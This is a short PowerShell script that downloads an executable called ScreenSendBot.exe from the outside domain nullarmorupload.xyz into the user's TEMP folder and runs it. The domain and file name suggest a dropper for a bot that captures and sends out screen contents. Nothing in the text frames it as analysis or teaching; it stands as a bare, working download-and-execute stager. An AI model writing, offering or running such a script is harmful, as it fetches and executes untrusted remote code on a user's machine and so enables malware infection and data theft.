# Define URL of the file
$url = "http://nullarmorupload.xyz/download/825a9046"

# Define local path to save the executable
$localPath = "$env:TEMP\ScreenSendBot.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $localPath

# Run the downloaded EXE
Start-Process -FilePath $localPath -Wait
